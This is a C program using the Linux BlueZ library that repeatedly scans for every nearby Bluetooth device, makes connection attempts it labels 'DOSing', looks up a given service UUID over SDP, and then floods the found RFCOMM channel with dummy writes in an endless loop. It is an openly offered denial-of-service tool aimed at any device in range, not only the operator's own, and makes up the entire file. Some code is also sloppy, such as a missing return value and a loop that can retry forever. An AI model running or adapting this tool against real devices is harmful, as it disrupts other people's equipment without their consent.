#include <stdio.h>
#include <errno.h>
#include <ctype.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <getopt.h>
#include <signal.h>
#include <sys/param.h>
#include <sys/ioctl.h>
#include <sys/socket.h>

#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/sdp.h>
#include <bluetooth/sdp_lib.h>
#include <bluetooth/rfcomm.h>


static void cmd_up(int ctl, int hdev, char *opt)
{
	/* Start HCI device */
	if (ioctl(ctl, HCIDEVUP, hdev) < 0) {
		if (errno == EALREADY)
			return;
		fprintf(stderr, "Can't init device hci%d: %s (%d)\n",
						hdev, strerror(errno), errno);
		exit(1);
	}
}


int str2uuid( const char *uuid_str, uuid_t *uuid ) 
{
    uint32_t uuid_int[4];
    char *endptr;

    if( strlen( uuid_str ) == 36 ) {
        // Parse uuid128 standard format: 12345678-9012-3456-7890-123456789012
        char buf[9] = { 0 };

        if( uuid_str[8] != '-' && uuid_str[13] != '-' &&
            uuid_str[18] != '-'  && uuid_str[23] != '-' ) {
            return 0;
        }
        // first 8-bytes
        strncpy(buf, uuid_str, 8);
        uuid_int[0] = htonl( strtoul( buf, &endptr, 16 ) );
        if( endptr != buf + 8 ) return 0;

        // second 8-bytes
        strncpy(buf, uuid_str+9, 4);
        strncpy(buf+4, uuid_str+14, 4);
        uuid_int[1] = htonl( strtoul( buf, &endptr, 16 ) );
        if( endptr != buf + 8 ) return 0;

        // third 8-bytes
        strncpy(buf, uuid_str+19, 4);
        strncpy(buf+4, uuid_str+24, 4);
        uuid_int[2] = htonl( strtoul( buf, &endptr, 16 ) );
        if( endptr != buf + 8 ) return 0;

        // fourth 8-bytes
        strncpy(buf, uuid_str+28, 8);
        uuid_int[3] = htonl( strtoul( buf, &endptr, 16 ) );
        if( endptr != buf + 8 ) return 0;

        if( uuid != NULL ) sdp_uuid128_create( uuid, uuid_int );
    } else if ( strlen( uuid_str ) == 8 ) {
        // 32-bit reserved UUID
        uint32_t i = strtoul( uuid_str, &endptr, 16 );
        if( endptr != uuid_str + 8 ) return 0;
        if( uuid != NULL ) sdp_uuid32_create( uuid, i );
    } else if( strlen( uuid_str ) == 4 ) {
        // 16-bit reserved UUID
        int i = strtol( uuid_str, &endptr, 16 );
        if( endptr != uuid_str + 4 ) return 0;
        if( uuid != NULL ) sdp_uuid16_create( uuid, i );
    } else {
        return 0;
    }

    return 1;
}

int bt_dos_target(bdaddr_t *target,short channel)
{
    struct sockaddr_rc remote_addr, local_addr;
    int sock;

    if ((sock = socket(PF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM)) < 0)  {
        perror("[-] socket\n");
        return 0;   
    }

    memset(&local_addr, 0, sizeof(local_addr));
    local_addr.rc_family = AF_BLUETOOTH;
    bacpy(&local_addr.rc_bdaddr, BDADDR_ANY); 
    
    if (bind(sock, (struct sockaddr *)&local_addr, sizeof(local_addr)) < 0)  {
        perror("[-] bind"); 
        close(sock);
        return 0;
    }

    memset(&remote_addr, 0, sizeof(remote_addr));
    remote_addr.rc_family = AF_BLUETOOTH;
    bacpy(&remote_addr.rc_bdaddr, target);
    remote_addr.rc_channel = channel;

    if (connect(sock, (struct sockaddr *)&remote_addr, sizeof(remote_addr)) < 0)  {
        perror("[-] connect\n");
    } else {
        //printf("[+] Done\n");
    }
    
    close(sock); /* close the socket */
}

void kill_all(int sock, int dev_id, uuid_t uuid)
{
    inquiry_info *info = NULL;
    char addr[19] = { 0 };
    char name[248] = { 0 };
    sdp_list_t *response_list = NULL, *search_list, *attrid_list;
    uint32_t range = 0x0000ffff;
    int s, loco_channel = -1, status;
    struct sockaddr_rc loc_addr = { 0 };
    int num_rsp, length, flags;
    int i, j, err, ctl;
    
    printf("Scanning ...\n");

    num_rsp = 10;
    flags = IREQ_CACHE_FLUSH;
    length = 8; /* ~10 seconds */
    num_rsp = hci_inquiry(dev_id, length, num_rsp, NULL, &info, flags);
    if (num_rsp < 0) {
        //perror("Inquiry failed");
	sleep(1);
        //exit(1);
	return ;
    }

    printf("No of resp %d\n",num_rsp);

    for (i = 0; i < num_rsp; i++) {
        
        
        sdp_session_t *session;
        int retries;
        int foundit, responses;
        ba2str(&(info+i)->bdaddr, addr);
        memset(name, 0, sizeof(name));
        if (hci_read_remote_name(sock, &(info+i)->bdaddr, sizeof(name), name, 0) < 0)
            strcpy(name, "[unknown]");
        
        printf("DOSing %s %s\n", addr, name);
        bt_dos_target(&(info+i)->bdaddr, 1);
        printf("Found %s  %s, searching for the the desired service on it now\n", addr, name);
        // connect to the SDP server running on the remote machine
sdpconnect:
        session = 0; retries = 0;
        while(!session) {
            session = sdp_connect( BDADDR_ANY, &(info+i)->bdaddr, SDP_RETRY_IF_BUSY );
            if(session) break;
            if(errno == EALREADY && retries < 5) {
                perror("Retrying");
                retries++;
                sleep(1);
                continue;
            }
            break;
        }
        if ( session == NULL ) {
            perror("Can't open session with the device");
            free(info);
            continue;
        }
        search_list = sdp_list_append( 0, &uuid );
        attrid_list = sdp_list_append( 0, &range );
        err = 0;
        err = sdp_service_search_attr_req( session, search_list, SDP_ATTR_REQ_RANGE, attrid_list, &response_list);
        sdp_list_t *r = response_list;
        sdp_record_t *rec;
        // go through each of the service records
        foundit = 0;
        responses = 0;
        for (; r; r = r->next ) {
                responses++;
                rec = (sdp_record_t*) r->data;
                sdp_list_t *proto_list;
                
                // get a list of the protocol sequences
                if( sdp_get_access_protos( rec, &proto_list ) == 0 ) {
                sdp_list_t *p = proto_list;

                    // go through each protocol sequence
                    for( ; p ; p = p->next ) {
                            sdp_list_t *pds = (sdp_list_t*)p->data;

                            // go through each protocol list of the protocol sequence
                            for( ; pds ; pds = pds->next ) {

                                    // check the protocol attributes
                                    sdp_data_t *d = (sdp_data_t*)pds->data;
                                    int proto = 0;
                                    for( ; d; d = d->next ) {
                                            switch( d->dtd ) { 
                                                    case SDP_UUID16:
                                                    case SDP_UUID32:
                                                    case SDP_UUID128:
                                                            proto = sdp_uuid_to_proto( &d->val.uuid );
                                                            break;
                                                    case SDP_UINT8:
                                                            if( proto == RFCOMM_UUID ) {
                                                                    printf("rfcomm channel: %d\n",d->val.int8);
                                                                    loco_channel = d->val.int8;
                                                                    foundit = 1;
                                                            }
                                                            break;
                                            }
                                    }
                            }
                            sdp_list_free( (sdp_list_t*)p->data, 0 );
                    }
                    sdp_list_free( proto_list, 0 );

                }
                if (loco_channel > 0)
                    break;

        }
        printf("No of Responses %d\n", responses);
        if ( loco_channel > 0 && foundit == 1 ) {
            printf("Found service on this device, now gonna blast it with dummy data\n");
            s = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);
            loc_addr.rc_family = AF_BLUETOOTH;
            loc_addr.rc_channel = loco_channel;
            loc_addr.rc_bdaddr = *(&(info+i)->bdaddr);
            status = connect(s, (struct sockaddr *)&loc_addr, sizeof(loc_addr));
            if( status < 0 ) {
                perror("uh oh");
            }
            do {
                status = write(s, "hello!", 6);
                printf ("Wrote %d bytes\n", status);
                sleep(1);
            } while (status > 0);
            close(s);
            sdp_record_free( rec );
        }

        sdp_close(session);
        if (loco_channel > 0) {
            goto sdpconnect;
            //break;
        }
    }
}

int main(void) {
	int sock, dev_id = -1, ctl;
	struct hci_dev_info dev_info;
	inquiry_info *info = NULL;
	uuid_t uuid = { 0 };
	//Change this to your apps UUID
	char *uuid_str="66841278-c3d1-11df-ab31-001de000a901";

	(void) signal(SIGINT, SIG_DFL);

	if ((ctl = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI)) < 0) {
		perror("Can't open HCI socket.");
		exit(1);
	}
	cmd_up(ctl, 0, NULL);

	dev_id = hci_get_route(NULL);
	if (dev_id < 0) {
		perror("No Bluetooth Adapter Available");
		exit(1);
	}

	if (hci_devinfo(dev_id, &dev_info) < 0) {
		perror("Can't get device info");
		exit(1);
	}

	sock = hci_open_dev( dev_id );
	if (sock < 0) {
		perror("HCI device open failed");
		free(info);
		exit(1);
	}

	
	if( !str2uuid( uuid_str, &uuid ) ) {
		perror("Invalid UUID");
		free(info);
		exit(1);
  }

	do {
        kill_all(sock, dev_id, uuid);
	} while (1);

	printf("Exiting...\n");
}
